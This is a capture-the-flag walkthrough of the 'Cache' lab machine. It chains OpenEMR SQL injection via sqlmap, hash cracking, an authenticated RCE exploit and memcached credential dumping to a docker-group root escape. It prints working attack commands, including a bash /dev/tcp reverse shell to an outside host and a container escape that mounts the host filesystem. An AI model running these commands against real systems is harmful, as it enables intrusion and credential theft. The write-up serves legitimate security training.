excerpt: "Cache is a medium difficulty Linux machine. Enumeration of the website reveals a second
website that is hosted on the same server under a different vhost. This website is an OpenEMR
instance that suffers from a SQL injection vulnerability. Exploiting this vulnerability enables the
attacker to retrieve the hashed password for user openemr_admin , which can be cracked offline
in order to recover the plaintext password. These credentials can be used to exploit an
authenticated Remote Command Execution vulnerability and achieve reverse shell as www-data ,
due to the outdated version of the OpenEMR instance. Inspection of the initial website reveals a
JavaScript file containing credentials for the user ash , who is found to be a system user.
Enumeration of the Memcached caching system also reveals the password for user luffy , who
is a member of the docker group. This enables the user luffy to run any commands as root,
from within a docker container."

## Synopsis

Cache is a medium difficulty Linux machine. Enumeration of the website reveals a second
website that is hosted on the same server under a different vhost. This website is an OpenEMR
instance that suffers from a SQL injection vulnerability. Exploiting this vulnerability enables the
attacker to retrieve the hashed password for user openemr_admin , which can be cracked offline
in order to recover the plaintext password. These credentials can be used to exploit an
authenticated Remote Command Execution vulnerability and achieve reverse shell as www-data ,
due to the outdated version of the OpenEMR instance. Inspection of the initial website reveals a
JavaScript file containing credentials for the user ash , who is found to be a system user.
Enumeration of the Memcached caching system also reveals the password for user luffy , who
is a member of the docker group. This enables the user luffy to run any commands as root,
from within a docker container.

## Reconaissance

### HTTP

Starting enumeration on http, let's added cache.htb into host file.

![](/assets/img/cache/1.png)

found the login page, when check the sourecode i found `functionallity.js`. This file contain username and password, so we enable to login.

```javascript
$(function(){
    var error\_correctPassword = false;
    var error\_username = false;
    
    function checkCorrectPassword(){
        var Password = $("#password").val();
        if(Password != 'H@v3\_fun'){
            alert("Password didn't Match");
            error\_correctPassword = true;
        }
    }
    function checkCorrectUsername(){
        var Username = $("#username").val();
        if(Username != "ash"){
            alert("Username didn't Match");
            error\_username = true;
        }
    }
    $("#loginform").submit(function(event) {
        /\* Act on the event \*/
        error\_correctPassword = false;
         checkCorrectPassword();
         error\_username = false;
         checkCorrectUsername();

        if(error\_correctPassword == false && error\_username ==false){
            return true;
        }
        else{
            return false;
        }
    });
});
```

i cannot find anything in this page, so i move on to the author page.

![](/assets/img/cache/3.png)

in about section of author, i found a clue `Check out his other projects like Cache:HMS(Hospital Management System)`. So i added new domain `hms.htb` into host file and found another page similiar below.

![](/assets/img/cache/8.png)

openemr ? there's a lot of Openemr in `searchsploit` with multiple bugs such as `RCE`, `SQLI`,`XSS`.

![](/assets/img/cache/7.png)

googling about 2018 openemr and found this official page in [here](https://www.open-emr.org/blog/openemr-version-501-released-ushers-in-golden-age-for-openemr/), hms.htb had Openemr with version `5.0.1.`; it is impossible to exploit, because we need credentials. in login form section i fireup `burpsuite` and make the request into and given name chache.req, then i used `sqlmap` for check SQLi potency without any luck.
and googling about openemr vulnerability will lead me into [this report poc](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf) about openemr. There's a lot of sql injecition and this poc is good report for my reference.

## Escalate Ash

In page 8 on `SQL Injection in add_edit_event_user.php` that's our poc in this case. We can add `/portal/add_edit_event_user.php?eid=1` into browser 

![](/assets/img/cache/9.png)

and fast we've got query error. That's nice!! send it the request using burpsuite given name as cache.req adn give a shoot to `sqlmap`.

```bash
sqlmap -r portal.req --batch --dbs
```

![](/assets/img/cache/10.png)


i just skip to all proses to get tables and column name, execute this command below for getting username

```bash
sqlmap -r portal.req --batch -D openemr -T users -C username --dump
```

![](/assets/img/cache/11.png)

and command for dumping password

```bash
sqlmap -r portal.req --batch -D openemr -T users_secure -C password --dump
```

![](/assets/img/cache/12.png)

yay! we've got salt password, let john the ripper crack this hash

![](/assets/img/cache/13.png)

let's jump intpo reverse shell with RCE authenticated, copy that exploit using `-m` on `searchsploit`.

![](/assets/img/cache/14.png)

execute command below will get hit back from target

```bash
python 45161.py -u openemr_admin -p xxxxxx -c "bash -i >& /dev/tcp/10.10.14.2/9000 0>&1 http://hms.htb/
```

![](/assets/img/cache/15.png)

there is ash user in file `/etc/passwd` we can use password that we've found earlier in javascript file. This box will need vertical escalation which mean we need to comprimise luffy user before reach root.

## Escalate Luffy

i found service running locally with port `112111` after using command `ss` with `-tln`

```bash
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port

ash@cache:~$ 
```

googling about this port and found the `memcached`

> **Memcached** is a general-purpose distributed [memory-caching](https://en.wikipedia.org/wiki/Memory_caching "Memory caching") system. It is often used to speed up dynamic [database](https://en.wikipedia.org/wiki/Database "Database")\-driven websites by caching data and [objects](https://en.wikipedia.org/wiki/Object_(computer_science) "Object (computer science)") in [RAM](https://en.wikipedia.org/wiki/Random-access_memory) to reduce the number of times an external data source (such as a database or API) must be read.

based on this [officially memcached documentation](https://www.tutorialspoint.com/memcached/memcached_stats.htm), we can extract manually memcached from server using `telnet`.

run `stats items` is used to get items statistics such as `count`, `age` organized by slabs ID

![](/assets/img/cache/17.png)

image above give us insight how the data is organized in slab **ID** 1, and keys can be dumped per slabs class like `stats cachedump 1 5`

![](/assets/img/cache/18.png)

dump all username and password with `get` + `item` command and get the two passwords and luffy as user.

![](/assets/img/cache/20.png)

`luffy:0n3_p1ec3`

login with ssh for better shell and now move onto root!!

## Privilege Escalation

run single  `id` command will give us information how to gain root access.
Actually this is **Highly Vulnerable** because `docker` run as root and luffy part of `docker group`, we can easily create a new container with mount all directory inside of it including root directory.

Execute this command below will create new container :

```bash
docker run -it -v /:/mnt --rm -it ubuntu chroot /mnt sh
```
